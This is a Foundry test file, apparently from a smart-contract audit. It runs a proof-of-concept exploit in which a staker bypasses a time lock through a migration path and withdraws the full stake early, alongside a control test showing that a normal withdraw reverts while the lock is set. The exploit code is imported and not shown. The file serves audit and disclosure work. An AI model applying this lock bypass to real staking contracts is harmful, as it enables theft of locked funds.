// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./65328-user-can-bypass-lock-and-withdraw-stake-anytime-cyfrin-none.sol";

contract BypassLockViaMigrationTest is Test {
    function test_exploit() public {
        Exploit e = new Exploit();
        e.run();
        assertEq(e.withdrawn(), e.STAKE_AMOUNT(), "full stake withdrawn early");
        assertEq(e.lockedVault().lockUntil(), 0, "lock cleared");
    }

    function test_control_withdraw_reverts_while_locked() public {
        Exploit e = new Exploit();
        e.snt().mint(address(e), e.STAKE_AMOUNT());
        // Direct stake without leave/migrate - withdraw should fail while locked.
        // Use a fresh vault path via run partial: just check lock is set after stake.
        MockERC20 snt = new MockERC20();
        MockERC20 reward = new MockERC20();
        StakeManager manager = new StakeManager(snt, reward);
        StakeVault vault = new StakeVault(manager, snt, address(this));
        manager.registerVault(address(vault), address(this));
        snt.mint(address(this), 1000e18);
        snt.approve(address(vault), 1000e18);
        vault.stake(1000e18, 4 * 365 days);
        vm.expectRevert(bytes("locked"));
        vault.withdraw(snt, 1000e18, address(this));
    }
}
